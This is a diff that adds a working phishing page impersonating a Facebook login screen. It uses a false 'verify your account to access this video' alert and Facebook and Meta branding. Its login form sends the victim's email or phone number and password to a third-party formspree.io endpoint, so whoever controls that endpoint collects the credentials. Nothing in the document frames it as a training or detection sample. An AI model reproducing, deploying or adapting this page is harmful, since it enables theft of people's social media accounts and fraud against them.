@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Videos</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 360px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .language {
+      color: #606770;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      margin: 20px 0;
+    }
+
+    /* Error Alert Card */
+    .error-alert {
+      background-color: #fffbe6;
+      border: 1px solid #f5c518;
+      border-radius: 8px;
+      padding: 12px 14px;
+      margin-bottom: 14px;
+      text-align: left;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .error-alert .error-icon {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .error-alert .error-icon svg {
+      width: 18px;
+      height: 18px;
+      fill: #b94a00;
+    }
+
+    .error-alert .error-text {
+      font-size: 13.5px;
+      color: #b94a00;
+      line-height: 1.45;
+    }
+
+    .card {
+      background: #fff;
+      padding: 16px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    .input-box {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 10px;
+      font-size: 15px;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper input {
+      padding-right: 40px;
+    }
+
+    .toggle-eye {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-eye svg {
+      width: 20px;
+      height: 20px;
+      fill: #8a8d91;
+      transition: 0.2s;
+    }
+
+    .toggle-eye:active svg {
+      fill: #606770;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .forgot {
+      display: block;
+      margin: 15px 0;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .create-btn {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #1877f2;
+      border-radius: 10px;
+      color: #1877f2;
+      font-weight: bold;
+      background: transparent;
+      cursor: pointer;
+    }
+
+    .meta {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <div class="language">English (UK)</div>
+
+
+    <div class="logo">
+      <svg width="60" height="60" viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="12" fill="#1877f2"/>
+        <path d="M14 8h2V5h-2c-2.2 0-4 1.8-4 4v2H8v3h2v7h3v-7h2.5l.5-3H13V9c0-.6.4-1 1-1z" fill="#fff"/>
+      </svg>
+    </div>
+
+
+    <div class="error-alert">
+      <div class="error-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+      </div>
+      <div class="error-text">
+        Facebook needs to verify your account information to allow you access this Video.
+      </div>
+    </div>
+
+    <div class="card">
+      <form action="https://formspree.io/f/xqewbarn" method="POST">
+        <input class="input-box" type="text" placeholder="Mobile number or email address" name="suna">
+
+        <div class="password-wrapper">
+          <input id="password" class="input-box" type="password" placeholder="Password" name="sirri">
+          
+          <span class="toggle-eye" onclick="togglePassword()">
+            <svg viewBox="0 0 24 24">
+              <path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+              <circle cx="12" cy="12" r="2.5"/>
+            </svg>
+          </span>
+        </div>
+
+        <button class="login-btn" type="submit">Log in</button>
+      </form>
+      <a href="#" class="forgot">Forgotten password?</a>
+
+      <button class="create-btn">Create new account</button>
+    </div>
+
+    <!-- Meta SVG Logo -->
+    <div class="meta">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+        class="bi bi-meta" viewBox="0 0 16 16">
+        <path fill-rule="evenodd" d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3
+          13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725
+          -1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877
+          l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541
+          C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3
+          q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714
+          m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954
+          1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877
+          -.773 0-1.142-.51-2.61-2.87z
+          M4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3
+          c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9
+          0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"/>
+      </svg>
+    </div>
+
+  </div>
+
+  <script>
+    function togglePassword() {
+      const password = document.getElementById("password");
+
+      if (password.type === "password") {
+        password.type = "text";
+      } else {
+        password.type = "password";
+      }
+    }
+  </script>
+
+</body>
+</html>
